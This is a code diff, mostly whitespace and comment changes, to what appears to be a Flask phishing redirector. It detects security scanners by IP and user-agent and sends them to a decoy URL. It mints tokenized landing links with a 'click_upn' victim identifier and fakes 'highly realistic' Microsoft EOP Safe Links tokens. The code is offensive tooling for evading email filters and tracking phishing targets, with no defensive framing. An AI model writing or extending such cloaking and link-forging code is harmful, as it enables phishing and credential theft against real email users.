@@ -103,11 +103,13 @@ SCANNER_UA_TOKENS = (
 ALLOWLIST_IPS = []
 ALLOWLIST_UA = ()
 
+
 def client_ip() -> str:
     xff = request.headers.get("X-Forwarded-For", "")
     if xff:
         return xff.split(",")[0].strip()
     return request.remote_addr or ""
+
 
 def classify(ip: str, ua: str) -> dict:
     out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
@@ -138,8 +140,10 @@ def classify(ip: str, ua: str) -> dict:
                 break
     return out
 
+
 def _valid_http_url(u: str) -> bool:
     return isinstance(u, str) and u.startswith(("http://", "https://"))
+
 
 def _append_query(base_url: str, extra: dict) -> str:
     if not extra:
@@ -151,6 +155,7 @@ def _append_query(base_url: str, extra: dict) -> str:
         parts.scheme, parts.netloc, parts.path,
         urlencode(existing), parts.fragment,
     ))
+
 
 # ---------------------------------------------------------------------------
 # KV (rate limit only)
@@ -171,6 +176,7 @@ async def kv_incr(key: str, ttl: int) -> int:
             log.error(json.dumps({"event": "kv_incr_failed", "err": str(e), "key": key[:32]}))
             return 0
 
+
 async def emit_log(event: dict) -> None:
     log.info(json.dumps(event, separators=(",", ":")))
     if LOG_WEBHOOK_URL:
@@ -179,6 +185,7 @@ async def emit_log(event: dict) -> None:
                 await c.post(LOG_WEBHOOK_URL, json=event)
         except httpx.HTTPError:
             pass
+
 
 def _apply_unified_headers(resp):
     resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private"
@@ -199,6 +206,7 @@ def _apply_unified_headers(resp):
         "frame-ancestors 'none'"
     )
 
+
 def _static_page(title: str, text: str, status_code: int):
     html = f"""<!doctype html><html><head><meta charset="utf-8"><title>{title}</title>
     <style>body{{font-family:system-ui,sans-serif;display:grid;place-items:center;min-height:100vh;margin:0;background:#f6f7f9}}
@@ -207,6 +215,7 @@ def _static_page(title: str, text: str, status_code: int):
     resp = make_response(html, status_code)
     _apply_unified_headers(resp)
     return resp
+
 
 LANDING = """<!doctype html>
 <html lang="en">
@@ -242,6 +251,7 @@ LANDING = """<!doctype html>
 </body>
 </html>"""
 
+
 # ---------------------------------------------------------------------------
 # routes
 # ---------------------------------------------------------------------------
@@ -249,9 +259,11 @@ LANDING = """<!doctype html>
 def health():
     return jsonify({"ok": True, "ts": int(time.time()), "mode": "broadcast"})
 
+
 @app.route("/", methods=["GET"])
 def root():
     return _static_page("Not found", "Nothing here.", 404)
+
 
 @app.route("/ls/<token>", methods=["GET"])
 async def landing(token: str):
@@ -272,9 +284,11 @@ async def landing(token: str):
         await emit_log({"event": "landing_scanner_redirect", **tag, "token": token[:12], "to": unwanted})
         return redirect(unwanted, code=302)
 
+    # forward allowed query params
     allowed = set(data.get("params", []))
     forwarded = {k: v for k, v in request.args.items() if k in allowed and v}
 
+    # fragment_param carries a value that becomes the #fragment on the target
     fp = data.get("fragment_param", "")
     if fp and request.args.get(fp):
         forwarded[fp] = request.args.get(fp)
@@ -309,6 +323,7 @@ async def landing(token: str):
     )
     _apply_unified_headers(resp)
     return resp
+
 
 @app.route("/submit/<token>", methods=["POST"])
 async def execute(token: str):
@@ -360,11 +375,13 @@ async def execute(token: str):
 
     target = data["target"]
 
+    # query-string params (previous behavior)
     allowed_q = set(data.get("params", []))
     q_forward = {k: request.form.get(k, "") for k in allowed_q if request.form.get(k)}
     if q_forward:
         target = _append_query(target, q_forward)
 
+    # fragment param — appended after '#'
     fp = data.get("fragment_param", "")
     fv = ""
     if fp:
@@ -381,7 +398,9 @@ async def execute(token: str):
     _apply_unified_headers(resp)
     return resp
 
+
 def generate_eop_token(target_url):
+    """Generates a highly realistic Microsoft EOP Safe Links token."""
     length = secrets.choice(range(180, 280))
     alphabet = string.ascii_letters + string.digits + "-_"
     
@@ -402,6 +421,7 @@ def generate_eop_token(target_url):
         
     final_payload = "".join(parts)
     return f"u001.{final_payload}"
+
 
 @app.route("/mint", methods=["POST"])
 def mint():
@@ -453,15 +473,15 @@ def mint():
         
     encoded_upn = quote(custom_token, safe='')
     
+    # Construct the URL with /ls/ and click_upn
+    final_url = f"{base}/ls/{tok}?click_upn={encoded_upn}"
+    
     return jsonify({
-        "url": f"{base}/ls/{tok}?click_upn={encoded_upn}",
+        "url": final_url,
         "token": tok,
-        "mode": "broadcast",
-        "params": allowed_params,
-        "fragment_param": fragment_param,
-        "unwanted_target": unwanted_target or UNWANTED_REDIRECT_URL,
         "click_upn": custom_token
     })
+
 
 if __name__ == "__main__":
     app.run(host="127.0.0.1", port=5000, debug=True)
